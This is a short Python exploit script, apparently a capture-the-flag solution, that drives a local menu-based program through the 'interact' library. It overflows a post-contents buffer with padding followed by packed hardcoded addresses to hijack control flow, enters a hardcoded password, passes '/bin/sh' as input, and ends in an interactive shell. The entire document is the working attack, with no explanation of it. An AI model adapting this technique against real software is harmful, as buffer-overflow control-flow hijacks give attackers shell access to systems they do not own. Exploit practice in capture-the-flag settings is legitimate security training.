import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil('Enter choice')
p.sendline('1')
#p.readuntil('Enter post title:')
p.sendline('A' * 30)
#p.readuntil('Enter post contents:')
p.sendline('B'*110 + 'C'*7 + '\0' + p64(0x400bce))
p.sendline('')
p.sendline('3')
p.sendline('')
p.sendline('2')
p.sendline('l0ln0onewillguessth1s')
p.sendline('')
p.sendline('0')
p.sendline('1')
p.sendline('"/bin/sh"')
p.sendline('1')
p.sendline('D'*30)
p.sendline('E'*110 + 'F'*7 + '\0' + p64(0x400b8a))
p.sendline('')
p.sendline('4')
p.sendline('')
p.sendline('2')
p.interactive()

p.interactive()
